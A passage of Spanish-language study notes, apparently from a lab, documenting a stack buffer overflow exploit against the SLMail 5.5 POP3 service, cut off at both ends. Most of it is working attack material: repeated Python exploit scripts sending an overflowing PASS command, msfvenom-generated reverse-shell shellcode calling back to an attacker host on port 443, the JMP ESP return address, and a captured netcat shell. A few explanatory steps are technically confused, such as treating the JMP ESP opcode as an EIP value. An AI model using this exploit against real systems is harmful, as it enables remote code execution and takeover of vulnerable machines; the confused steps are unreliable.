y9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk'

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

Al enviar esto, lo que veremos en [Immunity Debugger](Immunity%20Debugger.md) es un **ENP** específico que nos indicará el offset

![[ID_7.png]]

Entonces con ese "código" podemos extraer el offset con otra herramienta de [Metasploit](../../../Herramientas/Metasploit/Metasploit.md)

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A
```

Resultado:

```bash
[*] Exact match at offset 4654
```

Esto quiere decir que el punto exacto donde se produce el error, y por lo tanto se empieza a sobrescribir peligrosamente data en otro lugar al de la memoria dedicada para esto, es decir el **offset** que se almacena en el **EIP**. 

```python
#!/usr/bin/env python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

Confirmamos que las 4 B que hemos introducido salen en el **EIP**, 42 en ASCII corresponde a B

![[ID_8.png]]

---

En este punto, añadimos 200 bytes de relleno tras la dirección EIP para verificar cómo se asigna y gestiona el área de pila inmediatamente después de nuestro control del flujo: añadimos `after_eip = b"C"*200` 

```python
#!/usr/bin/env python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
# Añadimos 200 bytes tras EIP para observar el espacio de pila
after_eip = b"C"*200

payload = before_eip + eip + after_eip

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

Como vemos el EIP se mantiene mostrando los valores para 'B' `42424242` y ahora, además, modificamos el **ESP** que muestra `01A1A128` y en `ASCII "CCCCCC..."`

![[ID_9.png]]

Haciendo clip derecho en el valor del `ESP` podemos mostrar el `Follow Dump` y ver el espacio y las direcciones asignadas a nuestro payload

![[ID_10.png]]

---
1. **Observación de registros relevantes:** Documentar qué registros (EIP, ESP, EBP) cambian tras el envío de `after_eip`. Esto ayuda a entender el desplazamiento de la pila y a planificar la ubicación de la shellcode.
    
2. **Nota sobre alineación de pila:** Recordar que, dependiendo del tamaño del payload, puede ser necesario alinear el puntero de pila (`ESP`) antes de ejecutar código. Anotar la posible necesidad de `NOP sled` o alineación con instrucciones como `add esp, -0x10`.
---

El siguiente paso consiste en reemplazar el valor de EIP por la dirección que apunta a ESP (donde tenemos nuestros caracteres “C…”), de modo que, cuando la ejecución salte allí, todas las cadenas ASCII que hemos rellenado en la pila se interpreten como código. Para ello:

1. Identificamos una instrucción `JMP ESP` en algún módulo cargado (por ejemplo, en una DLL sin ASLR).
    
2. Sustituimos las 4 `B` de EIP por la dirección de ese `JMP ESP` (en formato little‑endian).
    
3. Al ejecutarse el overflow, EIP salta a ESP, e inmediatamente empezará a ejecutar el “NOP sled” y la shellcode que hemos situado después.
    

De este modo, controlamos el flujo y podemos lanzar nuestra payload desde la pila

---

### Bytearrays y detección de badchars

Un `bytearray` en Python es una secuencia mutable de valores de bytes, ideal para construir payloads paso a paso. Durante la detección de badchars, enviamos secuencias que contienen todos los posibles valores (0x00–0xFF) y comprobamos en el debugger cuáles se corrompen o eliminan, de modo que podamos evitar esos bytes al generar la shellcode

Con el comando `!mona bytearray -cpb "\x00"` en [Immunity Debugger](Immunity%20Debugger.md) creamos el siguiente script:

```python
#!/usr/bin/env python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + after_eip

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```


El resultado nos muestra lo siguiente:

Podemos con `!mona compare -a 0257A128 -f "C:\Users\vbouser\Desktop\Analysis\bytearray.bin"` comparar el `Follow Dump` de este payload que se introducimos en **ESP** y ver los **Badchars**

![[ID_14.png]]

Ahora sabiendo que los caracteres `\x00` y `\x0a` no los admite podemos modificar el script sabiendo que caracteres no admite

![[ID_15.png]]

Repetimos el proceso ahora habiendo quitando del payload del script `\x0a` y lanzamos el script

![[ID_16.png]]

Volvimos a filtrar el resultado con el comando de **mona** y vimos que además de excluye el carácter `\x0d`. Por lo que toca volver a modificarlo del script

```txt
!mona compare -a 01BDA128 -f  C:\Users\vbouser\Desktop\Analysis\bytearray.bin
```

Si volvemos a lanzar el script otra vez modificado, vemos que al hacer `Follow Dump` en el **ESP** podemos comprobar fácilmente que ahora esta la secuencia completa, salvo los 3 que quitamos (`\x00\x0a\x0d)')

![[ID_17.png]]

---
# Conclusión sobre Bytearrays y condición de posibilidad de Shellcode para RCE


Al generar y depurar un `bytearray` completo y filtrar los **badchars** (`�`, , ), hemos asegurado que nuestro payload no contenga bytes que interrumpan la transmisión o sean modificados por la aplicación. Esto nos permite:

- **Inyectar shellcode confiable**, libre de caracteres prohibidos, en la pila justo tras el salto `JMP ESP`.
    
- **Mantener la integridad** del puntero de pila (`ESP`), garantizando que la CPU lea y ejecute nuestra shellcode sin interrupciones.
    
- **Cumplir la condición necesaria** para lograr una ejecución remota de código (RCE): disponer de un espacio de memoria controlado que contenga un payload válido y ejecutable.
    

Con estas piezas en su lugar —offset identificado, badchars eliminados y dirección de salto establecida— estamos listos para reemplazar el `bytearray` de prueba por una shellcode real (por ejemplo, generada con `msfvenom`), desencadenando una RCE exitosa en SLMail 5.5.

### Bytearrays y uso con `!mona bytearray`

El uso de un `bytearray` en Python nos permite generar de manera dinámica una secuencia de valores de byte (0x00–0xFF) para probar qué caracteres resultan dañinos al transmitirlos a través del servicio.

- Podemos sobrescribir segmentos de memoria con todos los posibles valores.
    
- Identificamos los caracteres que provocan interrupciones o son filtrados por la aplicación.
    

## ¿Qué implica esto?

Al ejecutar el comando `!mona bytearray` en Immunity Debugger, obtenemos automáticamente un bloque de bytes que insertamos en el campo vulnerable. Si el registro EIP o ESP no muestra algunos valores, habremos detectado badchars que debemos excluir de nuestra shellcode.

## En resumen

La generación y análisis de un `bytearray` completo es una prueba fundamental para:

- Detectar y excluir **badchars** críticos (`�`, , , etc.).
    
- Asegurar que nuestra shellcode, libre de caracteres prohibidos, se transmitirá e interpretará correctamente.
    
- Preparar el terreno para inyectar código malicioso en memoria sin sorpresas.

---

# Búsqueda de OpCodes para saltar al ESP y ejecutar el Shellcode

Una vez generado el _shellcode_ y detectados los _badchars_, no podemos hacer que el registro `EIP` apunte directamente al shellcode, ya que este suele estar almacenado en el stack, específicamente apuntado por el registro `ESP`. Por tanto, nuestro objetivo será redirigir la ejecución hacia ese espacio de memoria.

## ¿Qué necesitamos?

Debemos buscar una instrucción tipo `JMP ESP`, que lo que hace es ejecutar el contenido apuntado por `ESP`. Así, cuando sobrescribamos `EIP` con la dirección donde se encuentra esta instrucción, el flujo saltará a nuestro shellcode.

## ¿Cómo lo hacemos?

Podemos usar **mona.py** (dentro de Immunity Debugger) para encontrar estas instrucciones dentro de módulos cargados por el binario que no estén protegidos con ASLR ni DEP.

```bash
!mona jmp -r esp
```

Esto nos devuelve direcciones de memoria donde se encuentra un `JMP ESP`. Copiamos una válida y la usaremos para sobrescribir `EIP`.

## ¿Y luego?

Una vez redirigido el flujo con `JMP ESP`, el procesador ejecutará lo que haya en el stack (nuestro shellcode). Así conseguimos ejecutar código arbitrario.

---

Usamos [msfvenom](msfvenom.md) para generar un payload válido

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.66 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
```

Payload:

```bash
"\xba\x4e\xd1\x35\xda\xdd\xc1\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\x1e\xdf\xd7\x2f\x62"
"\x37\x95\xd0\x9a\xc8\xfa\x59\x7f\xf9\x3a\x3d\xf4\xaa\x8a"
"\x35\x58\x47\x60\x1b\x48\xdc\x04\xb4\x7f\x55\xa2\xe2\x4e"
"\x66\x9f\xd7\xd1\xe4\xe2\x0b\x31\xd4\x2c\x5e\x30\x11\x50"
"\x93\x60\xca\x1e\x06\x94\x7f\x6a\x9b\x1f\x33\x7a\x9b\xfc"
"\x84\x7d\x8a\x53\x9e\x27\x0c\x52\x73\x5c\x05\x4c\x90\x59"
"\xdf\xe7\x62\x15\xde\x21\xbb\xd6\x4d\x0c\x73\x25\x8f\x49"
"\xb4\xd6\xfa\xa3\xc6\x6b\xfd\x70\xb4\xb7\x88\x62\x1e\x33"
"\x2a\x4e\x9e\x90\xad\x05\xac\x5d\xb9\x41\xb1\x60\x6e\xfa"
"\xcd\xe9\x91\x2c\x44\xa9\xb5\xe8\x0c\x69\xd7\xa9\xe8\xdc"
"\xe8\xa9\x52\x80\x4c\xa2\x7f\xd5\xfc\xe9\x17\x1a\xcd\x11"
"\xe8\x34\x46\x62\xda\x9b\xfc\xec\x56\x53\xdb\xeb\x99\x4e"
"\x9b\x63\x64\x71\xdc\xaa\xa3\x25\x8c\xc4\x02\x46\x47\x14"
"\xaa\x93\xc8\x44\x04\x4c\xa9\x34\xe4\x3c\x41\x5e\xeb\x63"
"\x71\x61\x21\x0c\x18\x98\xa2\xf3\x75\xa3\x70\x9c\x87\xa3"
"\x75\xe7\x01\x45\x1f\x07\x44\xde\x88\xbe\xcd\x94\x29\x3e"
"\xd8\xd1\x6a\xb4\xef\x26\x24\x3d\x85\x34\xd1\xcd\xd0\x66"
"\x74\xd1\xce\x0e\x1a\x40\x95\xce\x55\x79\x02\x99\x32\x4f"
"\x5b\x4f\xaf\xf6\xf5\x6d\x32\x6e\x3d\x35\xe9\x53\xc0\xb4"
"\x7c\xef\xe6\xa6\xb8\xf0\xa2\x92\x14\xa7\x7c\x4c\xd3\x11"
"\xcf\x26\x8d\xce\x99\xae\x48\x3d\x1a\xa8\x54\x68\xec\x54"
"\xe4\xc5\xa9\x6b\xc9\x81\x3d\x14\x37\x32\xc1\xcf\xf3\x52"
"\x20\xc5\x09\xfb\xfd\x8c\xb3\x66\xfe\x7b\xf7\x9e\x7d\x89"
"\x88\x64\x9d\xf8\x8d\x21\x19\x11\xfc\x3a\xcc\x15\x53\x3a"
"\xc5"
```

Para que el script quede listo necesitamos saber la dirección que nos permitirá saltar al **ESP** donde se interpretará nuestro **Shellcode**

En [Immunity Debugger](Immunity%20Debugger.md) `!mona modules` y seleccionamos cualquiera que no tenga ninguno de los primeros 5 valores de `True/False` en True, como el que seleccionamos en la imagen

![[ID_18.png]]

### Secuencia para Obtener el Opcode de `JMP ESP`

Ahora necesitamos obtener el opcode que nos permite saltar al registro `ESP`, de modo que nuestra ejecución se desplace hacia la zona de pila donde reside la shellcode.

1. **Ejecutamos la utilidad de Metasploit para ensamblar instrucciones**  
   Iniciamos el shell de NASM incluido en Metasploit:
   ```bash
   /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

Con esto abrimos un prompt donde podemos escribir instrucciones en ensamblador y ver su representación en bytes.

2. **Escribimos la instrucción de salto**  
    En el prompt de NASM escribimos:
    
    ```
    jmp ESP
    ```
    
    El assembler ensambla la instrucción y nos muestra su opcode en hexadecimal:
    
    ```
    00000000  FFE4              jmp esp
    ```
    
    Aquí `FFE4` es la codificación de la instrucción `jmp esp`.
    
3. **Convertimos el opcode para little‑endian**  
    Dado que en memoria Intel utiliza formato little‑endian, invertimos los bytes:
    
    ```
    FFE4  →  \xFF\xE4
    ```
    
    De este modo, cuando sobrescribamos `EIP`, pondremos primero `\xFF` y luego `\xE4`.
    
4. **Sustituimos las 4 ‘B’ en nuestro payload**  
    Hasta ahora hemos probado que las 4 bytes de relleno (`"BBBB"`) llegan a `EIP`. Ahora reemplazamos ese campo por la dirección de nuestro `JMP ESP`:
    
    ```python
    before_eip = b"A" * offset
    eip        = b"\xFF\xE4"                  # 2 bytes del opcode
    eip       += b"\x90\x90"                  # padding NOP para completar 4 bytes
    shellcode = (b"...")
    payload    = before_eip + eip + shellcode
    ```
    
    Con esto, al desencadenar el desbordamiento, `EIP` saltará directamente al contenido de `ESP`, donde hemos colocado nuestro “NOP sled” y la shellcode final.
    
5. **Verificamos en Immunity Debugger**  
    Ejecutamos de nuevo el script y comprobamos en la pestaña de registros que `EIP` contiene `0xFFFFE4` (little‑endian) y que la ejecución continúa en el área de pila señalada por `ESP`.
    

Con este proceso hemos identificado y aplicado correctamente el opcode de `JMP ESP`, lo que nos permite redirigir el flujo de ejecución hacia nuestro shellcode en la pila.

Ahora en [Immunity Debugger](Immunity%20Debugger.md) usamos `!mona find -s "\xFF\xE4" -m SLMFC.DLL`

![[ID_20.png]]

Copiamos la dirección con click derecho -> Copy to clipboard -> Address y modificamos el script de la siguiente manera:

```python
#!/usr/bin/env python3

from struct import pack
import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4c4d13)
shellcode= (b"\xba\x4e\xd1\x35\xda\xdd\xc1\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\x1e\xdf\xd7\x2f\x62"
b"\x37\x95\xd0\x9a\xc8\xfa\x59\x7f\xf9\x3a\x3d\xf4\xaa\x8a"
b"\x35\x58\x47\x60\x1b\x48\xdc\x04\xb4\x7f\x55\xa2\xe2\x4e"
b"\x66\x9f\xd7\xd1\xe4\xe2\x0b\x31\xd4\x2c\x5e\x30\x11\x50"
b"\x93\x60\xca\x1e\x06\x94\x7f\x6a\x9b\x1f\x33\x7a\x9b\xfc"
b"\x84\x7d\x8a\x53\x9e\x27\x0c\x52\x73\x5c\x05\x4c\x90\x59"
b"\xdf\xe7\x62\x15\xde\x21\xbb\xd6\x4d\x0c\x73\x25\x8f\x49"
b"\xb4\xd6\xfa\xa3\xc6\x6b\xfd\x70\xb4\xb7\x88\x62\x1e\x33"
b"\x2a\x4e\x9e\x90\xad\x05\xac\x5d\xb9\x41\xb1\x60\x6e\xfa"
b"\xcd\xe9\x91\x2c\x44\xa9\xb5\xe8\x0c\x69\xd7\xa9\xe8\xdc"
b"\xe8\xa9\x52\x80\x4c\xa2\x7f\xd5\xfc\xe9\x17\x1a\xcd\x11"
b"\xe8\x34\x46\x62\xda\x9b\xfc\xec\x56\x53\xdb\xeb\x99\x4e"
b"\x9b\x63\x64\x71\xdc\xaa\xa3\x25\x8c\xc4\x02\x46\x47\x14"
b"\xaa\x93\xc8\x44\x04\x4c\xa9\x34\xe4\x3c\x41\x5e\xeb\x63"
b"\x71\x61\x21\x0c\x18\x98\xa2\xf3\x75\xa3\x70\x9c\x87\xa3"
b"\x75\xe7\x01\x45\x1f\x07\x44\xde\x88\xbe\xcd\x94\x29\x3e"
b"\xd8\xd1\x6a\xb4\xef\x26\x24\x3d\x85\x34\xd1\xcd\xd0\x66"
b"\x74\xd1\xce\x0e\x1a\x40\x95\xce\x55\x79\x02\x99\x32\x4f"
b"\x5b\x4f\xaf\xf6\xf5\x6d\x32\x6e\x3d\x35\xe9\x53\xc0\xb4"
b"\x7c\xef\xe6\xa6\xb8\xf0\xa2\x92\x14\xa7\x7c\x4c\xd3\x11"
b"\xcf\x26\x8d\xce\x99\xae\x48\x3d\x1a\xa8\x54\x68\xec\x54"
b"\xe4\xc5\xa9\x6b\xc9\x81\x3d\x14\x37\x32\xc1\xcf\xf3\x52"
b"\x20\xc5\x09\xfb\xfd\x8c\xb3\x66\xfe\x7b\xf7\x9e\x7d\x89"
b"\x88\x64\x9d\xf8\x8d\x21\x19\x11\xfc\x3a\xcc\x15\x53\x3a"
b"\xc5"


payload = before_eip + eip + shellcode

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

Antes de lanzar el script, creamos un brakpoint en Immunity Debugger como se ve en las imágenes

![[ID_21.png]]

**Nota:** puede no lanzarse bien a la primera, darle de nuevo si no aparece el mismo código que **jmp esp**

![[ID_22.png]]

Creado el breakpoint, vamos a mostrar el 'Toggle' para ver si el flujo del programa pasa por la dirección **EIP**** que se muestra `5F4C4D13`

![[ID_23.png]]


![[ID_24.png]]

Lanzamos el script y el resultado es efectivamente la EIP **5F4C4D13**

![[ID_25.png]]

Al hacer de nuevo 'Follow in Dump' en el ESP vemos que se nos muestra nuestro shellcode creado con msfvenom

**Nota:** para avanzar en el breakpoint, usamos la pestaña que se indica en la imagen (la segunda desde el play)

![[ID_26.png]]

Una vez apuntamos `EIP` al `JMP ESP`, podemos tener dos problemas: el procesador salta antes de que el shellcode esté listo o no hay espacio suficiente en la pila. Para dar tiempo al payload usamos un “NOP sled” (serie de NOPs) antes de la shellcode, que ralentiza la ejecución hasta llegar al código útil. Y para asegurar espacio, ajustamos `ESP` (por ejemplo con `sub esp, 0x10`) y reservamos memoria. Con esto, nuestra shellcode se ejecuta confiablemente tras el overflow.

---

## Acceso con Reverse Shell
### NOPs

```python
#!/usr/bin/env python3

from struct import pack
import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4c4d13)
shellcode= (b"\xba\x4e\xd1\x35\xda\xdd\xc1\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\x1e\xdf\xd7\x2f\x62"
b"\x37\x95\xd0\x9a\xc8\xfa\x59\x7f\xf9\x3a\x3d\xf4\xaa\x8a"
b"\x35\x58\x47\x60\x1b\x48\xdc\x04\xb4\x7f\x55\xa2\xe2\x4e"
b"\x66\x9f\xd7\xd1\xe4\xe2\x0b\x31\xd4\x2c\x5e\x30\x11\x50"
b"\x93\x60\xca\x1e\x06\x94\x7f\x6a\x9b\x1f\x33\x7a\x9b\xfc"
b"\x84\x7d\x8a\x53\x9e\x27\x0c\x52\x73\x5c\x05\x4c\x90\x59"
b"\xdf\xe7\x62\x15\xde\x21\xbb\xd6\x4d\x0c\x73\x25\x8f\x49"
b"\xb4\xd6\xfa\xa3\xc6\x6b\xfd\x70\xb4\xb7\x88\x62\x1e\x33"
b"\x2a\x4e\x9e\x90\xad\x05\xac\x5d\xb9\x41\xb1\x60\x6e\xfa"
b"\xcd\xe9\x91\x2c\x44\xa9\xb5\xe8\x0c\x69\xd7\xa9\xe8\xdc"
b"\xe8\xa9\x52\x80\x4c\xa2\x7f\xd5\xfc\xe9\x17\x1a\xcd\x11"
b"\xe8\x34\x46\x62\xda\x9b\xfc\xec\x56\x53\xdb\xeb\x99\x4e"
b"\x9b\x63\x64\x71\xdc\xaa\xa3\x25\x8c\xc4\x02\x46\x47\x14"
b"\xaa\x93\xc8\x44\x04\x4c\xa9\x34\xe4\x3c\x41\x5e\xeb\x63"
b"\x71\x61\x21\x0c\x18\x98\xa2\xf3\x75\xa3\x70\x9c\x87\xa3"
b"\x75\xe7\x01\x45\x1f\x07\x44\xde\x88\xbe\xcd\x94\x29\x3e"
b"\xd8\xd1\x6a\xb4\xef\x26\x24\x3d\x85\x34\xd1\xcd\xd0\x66"
b"\x74\xd1\xce\x0e\x1a\x40\x95\xce\x55\x79\x02\x99\x32\x4f"
b"\x5b\x4f\xaf\xf6\xf5\x6d\x32\x6e\x3d\x35\xe9\x53\xc0\xb4"
b"\x7c\xef\xe6\xa6\xb8\xf0\xa2\x92\x14\xa7\x7c\x4c\xd3\x11"
b"\xcf\x26\x8d\xce\x99\xae\x48\x3d\x1a\xa8\x54\x68\xec\x54"
b"\xe4\xc5\xa9\x6b\xc9\x81\x3d\x14\x37\x32\xc1\xcf\xf3\x52"
b"\x20\xc5\x09\xfb\xfd\x8c\xb3\x66\xfe\x7b\xf7\x9e\x7d\x89"
b"\x88\x64\x9d\xf8\x8d\x21\x19\x11\xfc\x3a\xcc\x15\x53\x3a"
b"\xc5")


payload = before_eip + eip + b"\x90"*16 + shellcode

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

```bash
rlwrap nc -lvnp 443
```

Resultado:

```bash
listening on [any] 443 ...
connect to [192.168.1.66] from (UNKNOWN) [192.168.1.65] 49187
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Program Files\SLmail\System>
```

### Desplazamiento de pila

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

Resultado: decrementamos el valor del puntero de pila 16 byte

```bash
nasm > sub esp,0x10
00000000  83EC10            sub esp,byte +0x10
```

Obtenemos el valor `83EC10` el cual podemos añadir al script para obtener acceso shell

```python
#!/usr/bin/env python3

from struct import pack
import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4c4d13)
shellcode= (b"\xba\x4e\xd1\x35\xda\xdd\xc1\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\x1e\xdf\xd7\x2f\x62"
b"\x37\x95\xd0\x9a\xc8\xfa\x59\x7f\xf9\x3a\x3d\xf4\xaa\x8a"
b"\x35\x58\x47\x60\x1b\x48\xdc\x04\xb4\x7f\x55\xa2\xe2\x4e"
b"\x66\x9f\xd7\xd1\xe4\xe2\x0b\x31\xd4\x2c\x5e\x30\x11\x50"
b"\x93\x60\xca\x1e\x06\x94\x7f\x6a\x9b\x1f\x33\x7a\x9b\xfc"
b"\x84\x7d\x8a\x53\x9e\x27\x0c\x52\x73\x5c\x05\x4c\x90\x59"
b"\xdf\xe7\x62\x15\xde\x21\xbb\xd6\x4d\x0c\x73\x25\x8f\x49"
b"\xb4\xd6\xfa\xa3\xc6\x6b\xfd\x70\xb4\xb7\x88\x62\x1e\x33"
b"\x2a\x4e\x9e\x90\xad\x05\xac\x5d\xb9\x41\xb1\x60\x6e\xfa"
b"\xcd\xe9\x91\x2c\x44\xa9\xb5\xe8\x0c\x69\xd7\xa9\xe8\xdc"
b"\xe8\xa9\x52\x80\x4c\xa2\x7f\xd5\xfc\xe9\x17\x1a\xcd\x11"
b"\xe8\x34\x46\x62\xda\x9b\xfc\xec\x56\x53\xdb\xeb\x99\x4e"
b"\x9b\x63\x64\x71\xdc\xaa\xa3\x25\x8c\xc4\x02\x46\x47\x14"
b"\xaa\x93\xc8\x44\x04\x4c\xa9\x34\xe4\x3c\x41\x5e\xeb\x63"
b"\x71\x61\x21\x0c\x18\x98\xa2\xf3\x75\xa3\x70\x9c\x87\xa3"
b"\x75\xe7\x01\x45\x1f\x07\x44\xde\x88\xbe\xcd\x94\x29\x3e"
b"\xd8\xd1\x6a\xb4\xef\x26\x24\x3d\x85\x34\xd1\xcd\xd0\x66"
b"\x74\xd1\xce\x0e\x1a\x40\x95\xce\x55\x79\x02\x99\x32\x4f"
b"\x5b\x4f\xaf\xf6\xf5\x6d\x32\x6e\x3d\x35\xe9\x53\xc0\xb4"
b"\x7c\xef\xe6\xa6\xb8\xf0\xa2\x92\x14\xa7\x7c\x4c\xd3\x11"
b"\xcf\x26\x8d\xce\x99\xae\x48\x3d\x1a\xa8\x54\x68\xec\x54"
b"\xe4\xc5\xa9\x6b\xc9\x81\x3d\x14\x37\x32\xc1\xcf\xf3\x52"
